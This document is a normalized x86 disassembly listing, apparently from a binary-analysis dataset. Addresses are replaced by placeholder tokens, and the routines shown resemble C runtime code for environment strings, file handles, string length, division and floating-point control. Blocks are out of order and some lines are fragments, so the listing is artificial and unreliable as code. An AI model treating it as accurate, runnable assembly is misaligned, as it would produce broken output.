mov [ rw-data ] 0x2
jmp r-xdata
cmp [ edi ] bl
mov eax edi
je r-xdata
call [ GetEnvironmentStrings@IAT ]
mov edi eax
cmp edi ebx
je r-xdata
sub eax esi
mov edi [ WideCharToMultiByte@IAT ]
sar eax 0x1
push ebx
push ebx
inc eax
push ebx
push ebx
push eax
push esi
push ebx
push ebx
mov [ esp + 0x34 ] eax
call edi
mov ebp eax
cmp ebp ebx
je r-xdata
inc eax
inc eax
cmp [ eax ] bx
jne r-xdata
sub eax edi
inc eax
mov ebp eax
push ebp
call sub_4083df
mov esi eax
pop ecx
cmp esi ebx
jne r-xdata
inc eax
cmp [ eax ] bl
jne r-xdata
push esi
call [ FreeEnvironmentStringsW@IAT ]
mov eax ebx
jmp r-xdata
push ebp
call sub_4083df
cmp eax ebx
pop ecx
mov [ esp + 0x10 ] eax
je r-xdata
inc eax
inc eax
cmp [ eax ] bx
jne r-xdata
push ebp
push edi
push esi
call sub_40b1f0
add esp 0xc
xor esi esi
jmp r-xdata
inc eax
cmp [ eax ] bl
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
pop ecx
pop ecx
retn
push ebx
push ebx
push ebp
push eax
push [ esp + 0x24 ]
push esi
push ebx
push ebx
call edi
test eax eax
jne r-xdata
push edi
call [ FreeEnvironmentStringsA@IAT ]
mov eax esi
jmp r-xdata
mov ebx [ esp + 0x10 ]
push [ esp + 0x10 ]
call sub_4083b0
pop ecx
mov [ esp + 0x10 ] ebx
sub_40d09c
push esi
inc ebx
xor dh [ eax ]
pop eax
inc ebx
xor [ eax ] dh
push ebp
mov ebp esp
sub esp 0x8
push ebx
push esi
push edi
push ebp
cld
mov ebx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
test [ eax + 0x4 ] 0x6
jne r-xdata
push ebp
lea ebp [ ebx + 0x10 ]
push 0xffffffff
push ebx
call sub_40877a
add esp 0x8
pop ebp
mov eax 0x1
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x8 ]
mov [ ebx - 0x4 ] eax
mov esi [ ebx + 0xc ]
mov edi [ ebx + 0x8 ]
mov eax 0x1
jmp r-xdata
lea ecx [ esi + esi * 2 ]
cmp [ edi + ecx * 4 + 0x4 ] 0x0
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edi [ ebx + 0x8 ]
lea ecx [ esi + esi * 2 ]
mov esi [ edi + ecx * 4 ]
jmp r-xdata
push esi
push ebp
lea ebp [ ebx + 0x10 ]
call [ edi + ecx * 4 + 0x4 ]
pop ebp
pop esi
mov ebx [ ebp + 0xc ]
or eax eax
je r-xdata
cmp esi 0xffffffff
je r-xdata
js r-xdata
mov eax 0x0
jmp r-xdata
mov edi [ ebx + 0x8 ]
push ebx
call sub_408738
add esp 0x4
lea ebp [ ebx + 0x10 ]
push esi
push ebx
call sub_40877a
add esp 0x8
lea ecx [ esi + esi * 2 ]
push 0x1
mov eax [ edi + ecx * 4 + 0x8 ]
call sub_40880e
mov eax [ edi + ecx * 4 ]
mov [ ebx + 0xc ] eax
call [ edi + ecx * 4 + 0x8 ]
sub_40d17c
mov eax [ rw-data ]
cmp eax 0x1
je r-xdata
push 0xfc
call sub_40d1b5
mov eax [ rw-data ]
pop ecx
test eax eax
je r-xdata
test eax eax
jne r-xdata
push 0xff
call sub_40d1b5
pop ecx
call eax
retn
cmp [ rw-data ] 0x1
jne r-xdata
sub_40d1b5
push ebp
mov ebp esp
sub esp 0x1a4
mov edx [ ebp + 0x8 ]
xor ecx ecx
mov eax rw-data
push esi
mov esi ecx
shl esi 0x3
cmp edx [ esi + rw-data ]
jne r-xdata
add eax 0x8
inc ecx
cmp eax rw-data
jl r-xdata
pop esi
leave
retn
mov eax [ rw-data ]
cmp eax 0x1
je r-xdata
cmp edx [ eax ]
je r-xdata
lea eax [ ebp + 0x8 ]
lea esi [ esi + rw-data ]
push 0x0
push eax
push [ esi ]
call sub_40db20
pop ecx
push eax
push [ esi ]
push 0xfffffff4
call [ GetStdHandle@IAT ]
push eax
call [ WriteFile@IAT ]
test eax eax
jne r-xdata
cmp edx 0xfc
je r-xdata
cmp [ rw-data ] 0x1
je r-xdata
lea eax [ ebp - 0x1a4 ]
push 0x104
push eax
push 0x0
call [ GetModuleFileNameA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x1a4 ]
push edi
push eax
lea edi [ ebp - 0x1a4 ]
call sub_40db20
inc eax
pop ecx
cmp eax 0x3c
jbe r-xdata
lea eax [ ebp - 0x1a4 ]
push r--data
push eax
call sub_40e2b0
pop ecx
pop ecx
lea eax [ ebp - 0xa0 ]
push r--data
push eax
call sub_40e2b0
lea eax [ ebp - 0xa0 ]
push edi
push eax
call sub_40e2c0
lea eax [ ebp - 0xa0 ]
push r--data
push eax
call sub_40e2c0
push [ esi + rw-data ]
lea eax [ ebp - 0xa0 ]
push eax
call sub_40e2c0
push 0x12010
lea eax [ ebp - 0xa0 ]
push r--data
push eax
call sub_40e9c3
add esp 0x2c
pop edi
jmp r-xdata
lea eax [ ebp - 0x1a4 ]
push eax
call sub_40db20
mov edi eax
lea eax [ ebp - 0x1a4 ]
sub eax 0x3b
push 0x3
add edi eax
push r--data
push edi
call sub_409430
add esp 0x10
sub_40d36f
mov ecx [ esp + 0x4 ]
xor edx edx
mov [ rw-data ] ecx
mov eax rw-data
mov eax [ edx * 8 + rw-data ]
mov [ rw-data ] eax
retn
add eax 0x8
inc edx
cmp eax rw-data
jl r-xdata
cmp ecx [ eax ]
je r-xdata
cmp ecx 0x13
jb r-xdata
cmp ecx 0xbc
jb r-xdata
cmp ecx 0x24
ja r-xdata
mov [ rw-data ] 0x16
cmp ecx 0xca
mov [ rw-data ] 0x8
jbe r-xdata
mov [ rw-data ] 0xd
retn
retn
sub_40d3d6
push ebx
push esi
push edi
or ebx 0xffffffff
xor edi edi
xor esi esi
mov ecx rw-data
mov esi 0x100
push esi
call sub_4083df
test eax eax
pop ecx
je r-xdata
lea edx [ eax + 0x100 ]
pop edi
mov eax ebx
pop esi
pop ebx
retn
add [ rw-data ] 0x20
lea ecx [ edi * 4 + rw-data ]
lea edx [ eax + 0x100 ]
mov [ ecx ] eax
add ecx 0x4
inc edi
add esi 0x20
cmp ecx rw-data
jl r-xdata
test [ eax + 0x4 ] 0x1
je r-xdata
shl edi 0x5
mov ebx edi
and [ eax + 0x4 ] 0x0
or [ eax ] 0xffffffff
mov [ eax + 0x5 ] 0xa
mov edx [ ecx ]
add eax 0x8
add edx esi
jmp r-xdata
mov eax [ ecx ]
test eax eax
je r-xdata
jmp r-xdata
or [ eax ] 0xffffffff
sub eax [ ecx ]
sar eax 0x3
add eax esi
mov ebx eax
cmp ebx 0xffffffff
jne r-xdata
add eax 0x8
jmp r-xdata
cmp eax edx
jae r-xdata
cmp eax edx
jae r-xdata
sub_40d46b
mov eax [ esp + 0x4 ]
push esi
cmp eax [ rw-data ]
push edi
jae r-xdata
and [ rw-data ] 0x0
mov [ rw-data ] 0x9
or eax 0xffffffff
mov ecx eax
mov esi eax
sar ecx 0x5
and esi 0x1f
lea edi [ ecx * 4 + rw-data ]
shl esi 0x3
mov ecx [ edi ]
cmp [ ecx + esi ] 0xffffffff
jne r-xdata
cmp [ rw-data ] 0x1
push ebx
mov ebx [ esp + 0x14 ]
jne r-xdata
mov eax [ edi ]
mov [ eax + esi ] ebx
xor eax eax
pop ebx
jmp r-xdata
sub eax 0x0
je r-xdata
pop edi
pop esi
retn
push ebx
push 0xfffffff6
dec eax
je r-xdata
push ebx
push 0xfffffff5
jmp r-xdata
dec eax
jne r-xdata
call [ SetStdHandle@IAT ]
push ebx
push 0xfffffff4
jmp r-xdata
sub_40d4e2
mov ecx [ esp + 0x4 ]
push esi
cmp ecx [ rw-data ]
push edi
jae r-xdata
and [ rw-data ] 0x0
mov [ rw-data ] 0x9
or eax 0xffffffff
mov eax ecx
mov esi ecx
sar eax 0x5
and esi 0x1f
lea edi [ eax * 4 + rw-data ]
shl esi 0x3
mov eax [ edi ]
add eax esi
test [ eax + 0x4 ] 0x1
je r-xdata
cmp [ eax ] 0xffffffff
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
mov eax [ edi ]
or [ eax + esi ] 0xffffffff
xor eax eax
jmp r-xdata
xor eax eax
sub ecx eax
je r-xdata
pop edi
pop esi
retn
push eax
push 0xfffffff6
dec ecx
je r-xdata
push eax
push 0xfffffff5
jmp r-xdata
dec ecx
jne r-xdata
call [ SetStdHandle@IAT ]
push eax
push 0xfffffff4
jmp r-xdata
sub_40d55c
mov eax [ esp + 0x4 ]
cmp eax [ rw-data ]
jae r-xdata
and [ rw-data ] 0x0
mov [ rw-data ] 0x9
or eax 0xffffffff
retn
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
test [ ecx + eax * 8 + 0x4 ] 0x1
lea eax [ ecx + eax * 8 ]
je r-xdata
mov eax [ eax ]
retn
sub_40d599
mov eax [ esp + 0x4 ]
cmp eax [ rw-data ]
jae r-xdata
mov [ rw-data ] 0x9
or eax 0xffffffff
mov ecx eax
mov edx eax
sar ecx 0x5
and edx 0x1f
mov ecx [ ecx * 4 + rw-data ]
test [ ecx + edx * 8 + 0x4 ] 0x1
je r-xdata
push eax
call sub_40d55c
pop ecx
push eax
call [ FlushFileBuffers@IAT ]
test eax eax
jne r-xdata
xor eax eax
call [ GetLastError@IAT ]
jmp r-xdata
retn
mov [ rw-data ] eax
test eax eax
je r-xdata
sub_40d5f0
mov eax [ rw-data ]
push esi
push 0x14
test eax eax
pop esi
jne r-xdata
cmp eax esi
jge r-xdata
mov eax 0x200
jmp r-xdata
push 0x4
push eax
call sub_40ebbe
pop ecx
mov [ rw-data ] eax
test eax eax
pop ecx
jne r-xdata
mov eax esi
mov [ rw-data ] eax
xor ecx ecx
mov eax rw-data
push 0x4
push esi
mov [ rw-data ] esi
call sub_40ebbe
pop ecx
mov [ rw-data ] eax
test eax eax
pop ecx
jne r-xdata
mov edx [ rw-data ]
mov [ ecx + edx ] eax
add eax 0x20
add ecx 0x4
cmp eax rw-data
jl r-xdata
xor edx edx
mov ecx rw-data
push 0x1a
call sub_409624
pop ecx
or [ ecx ] 0xffffffff
test eax eax
jne r-xdata
mov eax edx
mov esi edx
sar eax 0x5
and esi 0x1f
mov eax [ eax * 4 + rw-data ]
mov eax [ eax + esi * 8 ]
cmp eax 0xffffffff
je r-xdata
pop esi
retn
add ecx 0x20
inc edx
cmp ecx rw-data
jl r-xdata
sub_40d6a9
inc [ rw-data ]
push 0x1000
call sub_4083df
pop ecx
mov ecx [ esp + 0x4 ]
test eax eax
mov [ ecx + 0x8 ] eax
je r-xdata
or [ ecx + 0xc ] 0x4
lea eax [ ecx + 0x14 ]
mov [ ecx + 0x8 ] eax
mov [ ecx + 0x18 ] 0x2
or [ ecx + 0xc ] 0x8
mov [ ecx + 0x18 ] 0x1000
jmp r-xdata
mov eax [ ecx + 0x8 ]
and [ ecx + 0x4 ] 0x0
mov [ ecx ] eax
retn
sub_40d713
push ebp
mov ebp esp
sub esp 0x1c
mov ecx [ ebp + 0xc ]
push ebx
xor ebx ebx
push esi
test cl 0x80
push edi
mov [ ebp - 0x1c ] 0xc
mov [ ebp - 0x18 ] ebx
je r-xdata
and [ ebp - 0x1 ] 0x0
mov [ ebp - 0x14 ] 0x1
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x1 ] 0x10
jmp r-xdata
push 0x3
mov eax ecx
pop esi
and eax esi
sub eax ebx
je r-xdata
test ch 0x40
jne r-xdata
mov eax 0x8000
test eax ecx
jne r-xdata
mov [ ebp - 0xc ] 0x80000000
dec eax
je r-xdata
or [ ebp - 0x1 ] 0x80
cmp [ rw-data ] eax
je r-xdata
mov [ ebp - 0x10 ] ebx
cmp eax 0x20
je r-xdata
mov [ ebp - 0xc ] 0x40000000
jmp r-xdata
dec eax
je r-xdata
cmp ecx 0x500
je r-xdata
je r-xdata
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
cmp eax 0x30
je r-xdata
mov eax [ ebp + 0x10 ]
cmp eax 0x10
je r-xdata
mov [ ebp - 0xc ] 0xc0000000
jmp r-xdata
mov [ rw-data ] 0x16
mov [ rw-data ] ebx
jmp r-xdata
mov [ ebp - 0x8 ] 0x1
cmp ecx 0x600
je r-xdata
mov [ ebp - 0x8 ] esi
jmp r-xdata
cmp ecx ebx
je r-xdata
mov edx 0x700
mov eax 0x400
and ecx edx
mov edi 0x100
cmp ecx eax
jg r-xdata
mov [ ebp - 0x10 ] 0x2
jmp r-xdata
cmp eax 0x40
jne r-xdata
or eax 0xffffffff
jmp r-xdata
test al 0x40
je r-xdata
mov ecx [ rw-data ]
not ecx
and ecx [ ebp + 0x14 ]
test cl 0x80
jne r-xdata
mov [ ebp - 0x8 ] 0x5
jmp r-xdata
cmp ecx edx
je r-xdata
mov eax [ ebp + 0xc ]
mov esi 0x80
test edi eax
je r-xdata
cmp ecx edi
je r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
test ah 0x10
je r-xdata
or esi 0x4000000
or [ ebp - 0xa ] 0x1
push 0x1
pop esi
jmp r-xdata
mov [ ebp - 0x8 ] 0x4
jmp r-xdata
cmp ecx 0x200
je r-xdata
test al 0x20
je r-xdata
or esi edi
cmp ecx 0x300
jne r-xdata
test al 0x10
je r-xdata
or esi 0x8000000
jmp r-xdata
mov [ ebp - 0x8 ] 0x2
jmp r-xdata
call sub_40d3d6
mov ebx eax
or edi 0xffffffff
cmp ebx edi
jne r-xdata
or esi 0x10000000
push 0x0
push esi
push [ ebp - 0x8 ]
lea eax [ ebp - 0x1c ]
push eax
push [ ebp - 0x10 ]
push [ ebp - 0xc ]
push [ ebp + 0x8 ]
call [ CreateFileW@IAT ]
mov esi eax
cmp esi edi
je r-xdata
and [ rw-data ] 0x0
mov [ rw-data ] 0x18
jmp r-xdata
call [ GetLastError@IAT ]
push eax
call sub_40d36f
pop ecx
push esi
call [ GetFileType@IAT ]
test eax eax
jne r-xdata
mov eax edi
jmp r-xdata
cmp eax 0x2
jne r-xdata
push esi
call [ CloseHandle@IAT ]
cmp eax 0x3
jne r-xdata
or [ ebp - 0x1 ] 0x40
jmp r-xdata
push esi
push ebx
call sub_40d46b
pop ecx
mov al [ ebp - 0x1 ]
pop ecx
mov esi ebx
mov ecx ebx
or al 0x1
sar ecx 0x5
and esi 0x1f
mov [ ebp + 0xb ] al
lea edi [ ecx * 4 + rw-data ]
shl esi 0x3
mov ecx [ edi ]
and [ ebp + 0xb ] 0x48
mov [ ecx + esi + 0x4 ] al
jne r-xdata
or [ ebp - 0x1 ] 0x8
cmp [ ebp + 0xb ] 0x0
jne r-xdata
test al 0x80
je r-xdata
mov eax ebx
test [ ebp + 0xc ] 0x8
je r-xdata
test [ ebp + 0xc ] 0x2
je r-xdata
mov eax [ edi ]
or [ eax + esi + 0x4 ] 0x20
lea eax [ eax + esi + 0x4 ]
push 0x2
push 0xffffffff
push ebx
call sub_40b9e2
add esp 0xc
cmp eax 0xffffffff
mov [ ebp - 0x10 ] eax
jne r-xdata
and [ ebp + 0x10 ] 0x0
lea eax [ ebp + 0x10 ]
push 0x1
push eax
push ebx
call sub_40b7ec
add esp 0xc
test eax eax
jne r-xdata
cmp [ rw-data ] 0x83
je r-xdata
push 0x0
push 0x0
push ebx
call sub_40b9e2
add esp 0xc
cmp eax 0xffffffff
jne r-xdata
cmp [ ebp + 0x10 ] 0x1a
jne r-xdata
jmp r-xdata
push ebx
call sub_40ad43
pop ecx
push [ ebp - 0x10 ]
push ebx
call sub_40ec93
pop ecx
cmp eax 0xffffffff
pop ecx
je r-xdata
sub_40d9cd
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x18
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov eax [ rw-data ]
xor ebx ebx
cmp eax ebx
jne r-xdata
cmp eax 0x2
jne r-xdata
lea eax [ ebp - 0x1c ]
push eax
push 0x1
pop esi
push esi
push r--data
push esi
call [ GetStringTypeW@IAT ]
test eax eax
je r-xdata
cmp eax 0x1
jne r-xdata
mov eax [ ebp + 0x1c ]
cmp eax ebx
jne r-xdata
lea eax [ ebp - 0x1c ]
push eax
push esi
push rw-data
push esi
push ebx
call [ GetStringTypeA@IAT ]
test eax eax
je r-xdata
mov eax esi
jmp r-xdata
xor eax eax
cmp [ ebp + 0x18 ] ebx
jne r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call [ GetStringTypeA@IAT ]
jmp r-xdata
mov eax [ rw-data ]
push 0x2
pop eax
mov [ rw-data ] eax
push ebx
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
mov eax [ ebp + 0x20 ]
neg eax
sbb eax eax
and eax 0x8
inc eax
push eax
push [ ebp + 0x18 ]
call [ MultiByteToWideChar@IAT ]
mov [ ebp - 0x20 ] eax
cmp eax ebx
je r-xdata
mov eax [ rw-data ]
mov [ ebp + 0x18 ] eax
lea esp [ ebp - 0x34 ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
mov [ ebp - 0x4 ] ebx
lea edi [ eax + eax ]
mov eax edi
add eax 0x3
and al 0xfc
call sub_408e30
mov [ ebp - 0x18 ] esp
mov esi esp
mov [ ebp - 0x24 ] esi
push edi
push ebx
push esi
call sub_40e540
add esp 0xc
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
cmp esi ebx
je r-xdata
push [ ebp - 0x20 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push 0x1
push [ ebp + 0x18 ]
call [ MultiByteToWideChar@IAT ]
cmp eax ebx
je r-xdata
push [ ebp + 0x14 ]
push eax
push esi
push [ ebp + 0x8 ]
call [ GetStringTypeW@IAT ]
jmp r-xdata
sub_40db20
mov ecx [ esp + 0x4 ]
test ecx 0x3
je r-xdata
mov eax [ ecx ]
mov edx 0x7efefeff
add edx eax
xor eax 0xffffffff
xor eax edx
add ecx 0x4
test eax 0x81010100
je r-xdata
mov al [ ecx ]
inc ecx
test al al
je r-xdata
mov eax [ ecx - 0x4 ]
test al al
je r-xdata
lea eax [ ecx - 0x1 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ecx 0x3
jne r-xdata
lea eax [ ecx - 0x4 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ah ah
je r-xdata
add eax 0x0
lea eax [ ecx - 0x3 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff0000
je r-xdata
lea eax [ ecx - 0x2 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff000000
je r-xdata
jmp r-xdata
sub_40db9b
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
pop ebp
retn
lea ecx [ ebp + 0x8 ]
and [ ebp + 0x8 ] 0x0
push ecx
push 0x0
push [ rw-data ]
push eax
lea eax [ ebp + 0xc ]
push 0x1
push eax
push 0x220
push [ rw-data ]
call [ WideCharToMultiByte@IAT ]
test eax eax
je r-xdata
mov cx [ ebp + 0xc ]
cmp cx 0xff
ja r-xdata
mov [ rw-data ] 0x2a
or eax 0xffffffff
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x1
mov [ eax ] cl
pop eax
pop ebp
retn
pop ebp
retn
sub_40dc10
push ebx
mov eax [ esp + 0x14 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
xor edx edx
div ecx
mov eax [ esp + 0x8 ]
div ecx
mov eax edx
xor edx edx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov ecx eax
mul [ esp + 0x14 ]
xchg ecx eax
mul [ esp + 0x10 ]
add edx ecx
jb r-xdata
pop ebx
retn 0x10
sub eax [ esp + 0x10 ]
sbb edx [ esp + 0x14 ]
cmp edx [ esp + 0xc ]
ja r-xdata
jb r-xdata
sub eax [ esp + 0x8 ]
sbb edx [ esp + 0xc ]
neg edx
neg eax
sbb edx 0x0
cmp eax [ esp + 0x8 ]
jbe r-xdata
sub_40dc85
push ebp
mov ebp esp
push ecx
push esi
fwait
fnstcw [ ebp - 0x4 ]
push [ ebp - 0x4 ]
call sub_40dcd0
mov esi eax
mov eax [ ebp + 0xc ]
not eax
and esi eax
mov eax [ ebp + 0x8 ]
and eax [ ebp + 0xc ]
or esi eax
push esi
call sub_40dd62
pop ecx
mov [ ebp + 0xc ] eax
pop ecx
fldcw [ ebp + 0xc ]
mov eax esi
pop esi
leave
retn
sub_40dcd0
push ebx
mov ebx [ esp + 0x8 ]
xor eax eax
push ebp
test bl 0x1
push edi
je r-xdata
test bl 0x4
je r-xdata
push 0x10
pop eax
test bl 0x8
je r-xdata
or al 0x8
test bl 0x10
je r-xdata
or al 0x4
test bl 0x20
je r-xdata
or al 0x2
test bl 0x2
je r-xdata
or al 0x1
movzx ecx bx
push esi
mov edx ecx
mov esi 0xc00
mov edi 0x300
and edx esi
mov ebp 0x200
je r-xdata
or eax 0x80000
and ecx edi
pop esi
je r-xdata
cmp edx 0x400
je r-xdata
or eax 0x20000
cmp ecx ebp
jne r-xdata
or ah 0x1
cmp edx 0x800
je r-xdata
retn
or eax 0x40000
pop edi
pop ebp
test bh 0x10
pop ebx
je r-xdata
or eax 0x10000
jmp r-xdata
or eax ebp
jmp r-xdata
cmp edx esi
jne r-xdata
or eax edi
jmp r-xdata
sub_40dd62
push ebx
mov ebx [ esp + 0x8 ]
xor eax eax
push esi
test bl 0x10
je r-xdata
test bl 0x8
je r-xdata
push 0x1
pop eax
test bl 0x4
je r-xdata
or al 0x4
test bl 0x2
je r-xdata
or al 0x8
test bl 0x1
je r-xdata
or al 0x10
test ebx 0x80000
je r-xdata
or al 0x20
mov ecx ebx
mov edx 0x300
and ecx edx
mov esi 0x200
je r-xdata
or al 0x2
mov ecx ebx
and ecx 0x30000
je r-xdata
cmp ecx 0x100
je r-xdata
or eax edx
cmp ecx 0x10000
jne r-xdata
or ah 0x4
cmp ecx esi
je r-xdata
retn
or ah 0x10
pop esi
test ebx 0x40000
pop ebx
je r-xdata
or eax esi
jmp r-xdata
or ah 0x8
jmp r-xdata
cmp ecx edx
jne r-xdata
or ah 0xc
jmp r-xdata
sub_40ddeb
push ebp
mov ebp esp
push ecx
cmp [ rw-data ] 0x0
push ebx
push esi
push edi
jne r-xdata
mov ebx [ ebp + 0x8 ]
mov edi 0x100
push 0x1
cmp ebx edi
pop esi
jge r-xdata
mov eax [ ebp + 0x8 ]
cmp eax 0x41
jl r-xdata
mov edx [ rw-data ]
mov eax ebx
sar eax 0x8
movzx ecx al
test [ edx + ecx * 2 + 0x1 ] 0x80
je r-xdata
cmp [ rw-data ] esi
jle r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp eax 0x5a
jg r-xdata
and [ ebp + 0x9 ] 0x0
mov [ ebp + 0x8 ] bl
mov eax esi
and [ ebp + 0xa ] 0x0
push 0x2
mov [ ebp + 0x8 ] al
mov [ ebp + 0x9 ] bl
pop eax
jmp r-xdata
mov eax [ rw-data ]
mov al [ eax + ebx * 2 ]
and eax esi
push esi
push ebx
call sub_40bc27
pop ecx
pop ecx
jmp r-xdata
add eax 0x20
jmp r-xdata
mov eax ebx
jmp r-xdata
cmp eax esi
jne r-xdata
push esi
push 0x0
lea ecx [ ebp - 0x4 ]
push 0x3
push ecx
push eax
lea eax [ ebp + 0x8 ]
push eax
push edi
push [ rw-data ]
call sub_40edd9
add esp 0x20
test eax eax
je r-xdata
test eax eax
jne r-xdata
movzx eax [ ebp - 0x3 ]
movzx ecx [ ebp - 0x4 ]
shl eax 0x8
or eax ecx
movzx eax [ ebp - 0x4 ]
jmp r-xdata
sub_40deb6
mov eax [ esp + 0x8 ]
push esi
push 0x20
cdq
pop ecx
idiv ecx
push 0x1f
mov esi eax
mov eax [ esp + 0x10 ]
cdq
idiv ecx
pop ecx
mov eax [ esp + 0x8 ]
sub ecx edx
or edx 0xffffffff
shl edx cl
not edx
test [ eax + esi * 4 ] edx
jne r-xdata
xor eax eax
pop esi
retn
inc esi
cmp esi 0x3
jge r-xdata
push 0x1
pop eax
pop esi
retn
lea eax [ eax + esi * 4 ]
inc esi
add eax 0x4
cmp esi 0x3
jl r-xdata
cmp [ eax ] 0x0
jne r-xdata
sub_40deff
mov eax [ esp + 0x8 ]
push ebx
push esi
push edi
push 0x20
mov ebx [ esp + 0x14 ]
cdq
pop ecx
idiv ecx
mov esi eax
mov eax [ esp + 0x14 ]
cdq
idiv ecx
lea edi [ ebx + esi * 4 ]
push edi
push 0x1f
pop ecx
push 0x1
pop eax
sub ecx edx
shl eax cl
push eax
push [ edi ]
call sub_40f028
add esp 0xc
dec esi
js r-xdata
pop edi
pop esi
pop ebx
retn
lea edi [ ebx + esi * 4 ]
push edi
push 0x1
push [ edi ]
call sub_40f028
add esp 0xc
dec esi
sub edi 0x4
test esi esi
jge r-xdata
test eax eax
je r-xdata
sub_40df55
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0xc ]
push ebx
push esi
push edi
lea edi [ eax - 0x1 ]
push 0x20
pop ecx
and [ ebp - 0x4 ] 0x0
lea ebx [ edi + 0x1 ]
push 0x20
mov eax ebx
pop esi
cdq
idiv ecx
push 0x1f
mov ecx eax
mov eax ebx
cdq
idiv esi
mov eax [ ebp + 0x8 ]
pop esi
push 0x1
mov [ ebp - 0x8 ] ecx
lea eax [ eax + ecx * 4 ]
mov [ ebp + 0xc ] eax
sub esi edx
pop edx
mov ecx esi
shl edx cl
test [ eax ] edx
je r-xdata
or edx 0xffffffff
mov ecx esi
shl edx cl
push 0x3
pop ecx
and [ eax ] edx
mov eax [ ebp - 0x8 ]
inc eax
cmp eax ecx
jge r-xdata
inc ebx
push ebx
push [ ebp + 0x8 ]
call sub_40deb6
pop ecx
test eax eax
pop ecx
jne r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
leave
retn
mov edx [ ebp + 0x8 ]
sub ecx eax
lea edi [ edx + eax * 4 ]
xor eax eax
[ edi ]
mov eax [ ebp + 0xc ]
push edi
push [ ebp + 0x8 ]
call sub_40deff
pop ecx
mov [ ebp - 0x4 ] eax
pop ecx
sub_40dfe1
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
push esi
push 0x3
sub ecx eax
pop edx
mov esi [ eax ]
mov [ ecx + eax ] esi
add eax 0x4
dec edx
jne r-xdata
pop esi
retn
sub_40e008
mov eax [ esp + 0x4 ]
xor ecx ecx
xor eax eax
retn
inc ecx
add eax 0x4
cmp ecx 0x3
jl r-xdata
cmp [ eax ] 0x0
jne r-xdata
push 0x1
pop eax
retn
sub_40e023
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0xc ]
push ebx
push esi
push edi
push 0x20
mov edi [ ebp + 0x8 ]
pop ebx
or esi 0xffffffff
cdq
mov ecx ebx
mov [ ebp - 0x4 ] 0x3
idiv ecx
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0xc ]
cdq
idiv ecx
and [ ebp + 0xc ] 0x0
mov ecx edx
shl esi cl
sub ebx edx
not esi
mov eax [ edi ]
mov ecx eax
and ecx esi
mov [ ebp - 0x8 ] ecx
mov ecx edx
shr eax cl
or eax [ ebp + 0xc ]
mov [ edi ] eax
mov eax [ ebp - 0x8 ]
mov ecx ebx
add edi 0x4
shl eax cl
dec [ ebp - 0x4 ]
mov [ ebp + 0xc ] eax
jne r-xdata
mov edi [ ebp - 0xc ]
push 0x2
pop ebx
mov esi edi
push 0x8
pop ecx
shl esi 0x2
mov eax [ ebp + 0x8 ]
and [ ecx + eax ] 0x0
mov edx [ ebp + 0x8 ]
mov eax ecx
sub eax esi
mov eax [ eax + edx ]
mov [ ecx + edx ] eax
jmp r-xdata
cmp ebx edi
jl r-xdata
pop edi
pop esi
pop ebx
leave
retn
dec ebx
sub ecx 0x4
jns r-xdata
sub_40e0b0
push ebp
mov ebp esp
sub esp 0x18
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
movzx ecx [ eax + 0xa ]
mov ebx ecx
and ecx 0x8000
mov [ ebp + 0x8 ] ecx
mov ecx [ eax + 0x6 ]
mov [ ebp - 0xc ] ecx
mov ecx [ eax + 0x2 ]
movzx eax [ eax ]
mov edi [ ebp + 0x10 ]
and ebx 0x7fff
sub ebx 0x3fff
mov [ ebp - 0x8 ] ecx
shl eax 0x10
cmp ebx 0xffffc001
mov [ ebp - 0x4 ] eax
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x18 ]
push eax
call sub_40dfe1
push [ edi + 0x8 ]
lea eax [ ebp - 0xc ]
push eax
call sub_40df55
add esp 0x10
test eax eax
je r-xdata
lea eax [ ebp - 0xc ]
xor esi esi
push eax
call sub_40e008
test eax eax
pop ecx
jne r-xdata
mov eax [ edi + 0x4 ]
mov ecx eax
sub ecx [ edi + 0x8 ]
cmp ebx ecx
jge r-xdata
inc ebx
xor eax eax
lea eax [ ebp - 0xc ]
push eax
call sub_40dffc
pop ecx
cmp ebx eax
jg r-xdata
lea eax [ ebp - 0xc ]
